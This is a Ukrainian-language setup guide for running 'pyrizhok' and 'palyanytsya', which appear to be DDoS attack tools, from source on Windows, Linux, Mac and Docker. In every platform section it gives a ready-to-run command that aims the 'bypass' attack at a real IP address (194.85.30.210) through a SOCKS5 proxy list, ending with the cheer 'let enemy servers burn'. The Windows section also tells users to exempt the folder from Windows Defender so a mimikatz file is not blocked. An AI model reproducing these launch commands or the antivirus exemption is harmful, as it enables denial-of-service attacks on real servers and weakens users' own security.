# 🥡 Запуск вихідного коду (детальний гайд)

У цьому документі зібрані інструкції для запуска пиріжка та паляниці з вихідного коду, без створення білдів.

Зважаючи на те, що команди мають певні відмінності в залежності від платфоми, оберіть гайд під свою платфому:

- [💻 Windows](#windows)
- [🐧 Linux](#linux)
- [🍎 Mac](#mac)
- [🐋 Docker](#docker)

> **💡** Якщо ви хочете зекономити час і не цураєтеся запускати готові білди, [скористуйтеся інструкцією у швидкому старті](QUICKSTART.md).

---

## <a name="windows"></a>💻 Windows

Щоб запустити софт на Windows:

1. Встановіть [Git][git-download-windows].

2. Встановіть [Python 3.10.2][python-3.10.2-download].
   > **⚠** Паляниця з пиріжком потребують версію Python не менше ніж [**3.10.2**][python-3.10.2-download].

3. Відкрийте командний рядок: 
   - натисніть **_Win+R_**
   - у вікні, що з‘явилося, введіть: **_cmd_**
   - натисніть **_Enter_**
   
   Команди з наступних кроків вводіть у командний рядок, що відкрився.

4. Перейдіть до папки, в яку ви завантажите паляницю. Наприклад:
   ```shell
   cd "C:\Users\USER_NAME\Downloads"
   ```
   > **💡** Щоб легко знайти повний шлях до бажаної папки, перейдіть до неї в **Провіднику** та скопіюйте адресу звідти. Потім перейдіть до цієї папки в cmd додавши ії до команди cd (як у прикладі вище).

5. Завантажте проект:
   ```shell
   git clone https://github.com/pocket-sunflower/palyanytsya.git
   ```
   
6. Перейдіть до папки проекту:
   ```shell
   cd palyanytsya
   ```

7. Встановіть [**_virtualenv_**][virtualenv] за допомогою **_pip_**:
   ```shell
   py -m pip install virtualenv
   ```

8. Створіть віртуальне середовище:
   ```shell
   py -m virtualenv --python python3.10 venv
   ```
   
9. Активуйте віртуальне середовище:
   ```shell
   venv\Scripts\activate
   ```
   
10. Встановіть залежності:
    ```shell
    pip install -r requirements.txt
    ```
    > **⚠** Якщо ви працюєте на Windows 10, можлива помилка при встановленні бібліотеки [impacket][impacket]. Причина в тому, що це бібліотека для аналізу мережевих пакетів, яка може блокуватися Windows Defender (а саме, блокується файл _mimikatz.py_). Щоби уникнути помилок при встановленні залежностей, [додайте папку з паляницею до списку винятків Windows Defender][windows-defender-exception]. Після цього, запустіть команду знову.

11. Все готове до запуску! Запустіть **пиріжок**:
    ```shell
    python pyrizhok.py
    ```
    ...або **паляницю**:
    ```shell
    python palyanytsya.py bypass 194.85.30.210 5 100 socks5.txt 10000 3600
    ```
    > **ℹ** Для того, щоб дізнатися більше про можливі параметри для запуску, [подивіться сюди][readme-parameters].

Після першого налаштування, процес запуску набагато швидший:

1. Відкрийте командний рядок.
2. Перейдіть до папки з паляницею.
3. Активуйте віртуальне середовище:
   ```shell
   venv\Scripts\activate
   ```
4. Запустіть програму:
   ```shell
   python pyrizok.py
   ```

І нехай ворожі сервери палають! 🔥

---

## <a name="linux"></a>🐧 Linux

Щоб запустити софт на Linux:

1. Відкрийте ваш улюблений термінал.

2. Встановіть Git:
   ```bash
   sudo apt install git
   ```

3. Встановіть [Python 3.10.2][python-3.10.2-download]:
   > **⚠** Паляниця з пиріжком потребують версію Python не менше ніж [**3.10.2**][python-3.10.2-download].
   ```bash
   sudo apt install python3.10
   ```

4. Перейдіть до папки, в яку ви завантажите паляницю. Наприклад:
   ```bash
   cd ~/Downloads
   ```

5. Завантажте проект:
   ```bash
   git clone https://github.com/pocket-sunflower/palyanytsya.git
   ```
   
6. Перейдіть до папки проекту:
   ```bash
   cd palyanytsya
   ```

7. Встановіть [**_virtualenv_**][virtualenv] за допомогою **_pip_**:
   ```bash
   python3 -m pip install virtualenv
   ```

8. Створіть віртуальне середовище:
   ```bash
   python3 -m virtualenv --python python3.10 venv
   ```
   
9. Активуйте віртуальне середовище:
   ```bash
   source venv/bin/activate
   ```
   
10. Встановіть залежності:
    ```bash
    pip install -r requirements.txt
    ```

11. Все готове до запуску! Запустіть **пиріжок**:
    ```shell
    python pyrizhok.py
    ```
    ...або **паляницю**:
    ```shell
    python palyanytsya.py bypass 194.85.30.210 5 100 socks5.txt 10000 3600
    ```
    > **ℹ** Для того, щоб дізнатися більше про можливі параметри для запуску, [подивіться сюди][readme-parameters].

Після першого налаштування, процес запуску набагато швидший:

1. Відкрийте термінал.
2. Перейдіть до папки з паляницею.
3. Активуйте віртуальне середовище:
   ```bash
   source venv/bin/activate
   ```
4. Запустіть програму:
   ```bash
   python pyrizok.py
   ```

І нехай ворожі сервери палають! 🔥

---

## <a name="mac"></a>🍎 Mac

Щоб запустити софт на Mac:

1. Відкрийте термінал.

2. Встановіть менеджер пакетів [Homebrew][homebrew]:
   ```bash
   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
   ```

4. Встановіть Git:
   ```bash
   brew install git
   ```

5. Встановіть [Python 3.10.2][python-3.10.2-download]:
   > **⚠** Паляниця з пиріжком потребують версію Python не менше ніж [**3.10.2**][python-3.10.2-download].
   ```bash
   brew install python@3.10
   ```

6. Перейдіть до папки, в яку ви завантажите паляницю. Наприклад:
   ```bash
   cd ~/Downloads
   ```

7. Завантажте проект:
   ```bash
   git clone https://github.com/pocket-sunflower/palyanytsya.git
   ```
   
8. Перейдіть до папки проекту:
   ```bash
   cd palyanytsya
   ```

9. Встановіть [**_virtualenv_**][virtualenv] за допомогою **_pip_**:
   ```bash
   python3 -m pip install virtualenv
   ```

10. Створіть віртуальне середовище:
    ```bash
    python3 -m virtualenv --python python3.10 venv
    ```
   
11. Активуйте віртуальне середовище:
    ```bash
    source venv/bin/activate
    ```
   
12. Встановіть залежності:
    ```bash
    pip install -r requirements.txt
    ```

13. Все готове до запуску! Запустіть **пиріжок**:
    ```shell
    python pyrizhok.py
    ```
    ...або **паляницю**:
    ```shell
    python palyanytsya.py bypass 194.85.30.210 5 100 socks5.txt 10000 3600
    ```
    > **ℹ** Для того, щоб дізнатися більше про можливі параметри для запуску, [подивіться сюди][readme-parameters].

Після першого налаштування, процес запуску набагато швидший:

1. Відкрийте термінал.
2. Перейдіть до папки з паляницею.
3. Активуйте віртуальне середовище:
   ```bash
   source venv/bin/activate
   ```
4. Запустіть програму:
   ```bash
   python pyrizok.py
   ```

І нехай ворожі сервери палають! 🔥

---

## <a name="docker"></a>🐋 Docker

Щоб запустити софт на Docker:

1. Встановіть Docker:
   - на Windows, встановіть [Docker Desktop з WSL-бекендом][docker-desktop-windows]
   - на Mac, встановіть [Docker Desktop][docker-desktop-mac]
   - на Linux, встановіть Docker через термінал:
     ```bash
     sudo apt install docker
     ```

2. Відкрийте термінал.
   > **ℹ** На Windows, відкрийте Linux-термінал з WSL.
3. Запустіть контейнер з **пиріжком**:
     ```bash
     docker run --rm -it pocketsunflower/pyrizhok:latest
     ```
     ...або з **паляницею**:
     ```bash
     docker run --rm -it pocketsunflower/palyanytsya:latest 194.85.30.210 5 100 socks5.txt 10000 3600
     ```

Якщо треба бути перезапустити контейнер та при цьому завантажити найновішу версію:
   
1. Видаліть локальний образ:
   ```bash
   docker image rm --force pocketsunflower/pyrizhok:latest
   ```
   ...або:
   ```bash 
   docker image rm --force pocketsunflower/palyanytsya:latest 
   ```
4. Запустіть новий контейнер (найновіша версія завантажиться автоматично):
     ```bash
     docker run --rm -it pocketsunflower/pyrizhok:latest
     ```
     ...або:
     ```bash
     docker run --rm -it pocketsunflower/palyanytsya:latest 194.85.30.210 5 100 socks5.txt 10000 3600
     ```

І нехай ворожі сервери палають! 🔥

---

<div style="text-align: center">Все буде Україна 💙💛</div>

[← Назад до головної](../README.md)

<!--- References --->
[readme-parameters]: https://github.com/pocket-sunflower/palyanytsya#parameters
[virtualenv]: https://virtualenv.pypa.io/en/latest/
[git-download-windows]: https://git-scm.com/download/win
[python-3.10.2-download]: https://www.python.org/downloads/release/python-3102/
[impacket]: https://pypi.org/project/impacket/
[windows-defender-exception]: https://support.microsoft.com/uk-ua/windows/%D0%B4%D0%BE%D0%B4%D0%B0%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B2%D0%B8%D0%BD%D1%8F%D1%82%D0%BA%D1%83-%D0%B4%D0%BE-%D1%81%D0%BB%D1%83%D0%B6%D0%B1%D0%B8-%D0%B1%D0%B5%D0%B7%D0%BF%D0%B5%D0%BA%D0%B0-%D1%83-windows-811816c0-4dfd-af4a-47e4-c301afe13b26
[git-install-macos]: https://git-scm.com/book/en/v2/Getting-Started-Installing-Git
[homebrew]: https://brew.sh/
[docker-desktop-windows]: https://docs.docker.com/desktop/windows/install/
[docker-desktop-mac]: https://docs.docker.com/desktop/mac/install/
